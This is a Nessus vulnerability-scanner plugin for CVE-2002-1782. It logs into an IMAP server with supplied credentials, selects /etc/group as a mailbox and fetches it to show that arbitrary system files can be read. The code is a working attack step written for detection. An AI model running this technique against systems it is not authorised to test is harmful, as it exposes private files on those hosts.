#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(12254);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2002-1782");
  script_bugtraq_id(4909);

  name["english"] = "IMAP arbitrary file retrieval";
  script_name(english:name["english"]);

  desc["english"] = "
The target is running an IMAP daemon that allows an authenticated user
to retrieve and manipulate files that would be available to that user
via a shell.  If IMAP users are denied shell access, you may consider
this a vulnerability.

See also : http://www.washington.edu/imap/IMAP-FAQs/index.html#5.1
Solution : Contact your vendor for a fix.
Risk factor : Medium";
  script_description(english:desc["english"]);

  summary["english"] = "Checks for IMAP arbitrary file retrieval vulnerability";
  script_summary(english:summary["english"]);

  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "Remote file access";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes", "global_settings.nasl", "logins.nasl");
  script_require_ports("Services/imap", 143);
  script_exclude_keys("imap/false_imap");
  script_require_keys("imap/login", "imap/password");
  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");

file = "/etc/group";                    # file to grab from target.
user = get_kb_item("imap/login");
pass = get_kb_item("imap/password");
if (!user || !pass) {
  if (log_verbosity > 1) display("imap/login and/or imap/password are empty; ", SCRIPT_NAME, " skipped!\n");
  exit(1);
}

port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port)) exit(0);

# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);

# Read banner.
s = recv_line(socket:soc, length:1024);
if (!strlen(s)) {
  close(soc);
  exit(0);
}
s = chomp(s);

# Try to log in.
#
# - try the PLAIN SASL mechanism.
#   nb: RFC 3501 requires this be supported by imap4rev1 servers, although
#       it may also require SSL / TLS encapsulation.
++tag;
c = string("a", string(tag), ' AUTHENTICATE "PLAIN"');
send(socket:soc, data:string(c, "\r\n"));
s = recv_line(socket:soc, length:1024);
s = chomp(s);
if (s =~ "^\+") {
  c = base64(str:raw_string(0, user, 0, pass));
  send(socket:soc, data:string(c, "\r\n"));
  # nb: I'm not sure why, but the following recv_line often times out
  #     unless I either sleep for a bit before or specify a timeout
  #     even though the actual delay / timeout seems irrelevant.
  while (s = recv_line(socket:soc, length:1024, timeout:1)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = "";
  }
}

# If that didn't work, try LOGIN command.
if (isnull(resp)) {
  ++tag;
  c = string("a", string(tag), " LOGIN ", user, " ", pass);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = "";
  }
}

# If successful, try to select an arbitrary file to use as a mailbox.
if (resp && resp =~ "OK") {
  ++tag;
  c = string("a", string(tag), ' SELECT "', file, '"');
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = "";
  }

  # If successful, try to read the file.
  #
  # NB: this isn't really necessary since the previous command,
  #     if successful, means we can read the file.
  if (resp && resp =~ "OK") {
    ++tag;
    c = string("a", string(tag), " FETCH 1 rfc822");
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
      resp = "";
    }
    if (resp && resp =~ "OK") security_warning(port);
  }
}

# Logout.
++tag;
c = string("a", string(tag), " LOGOUT");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = "";
}
close(soc);
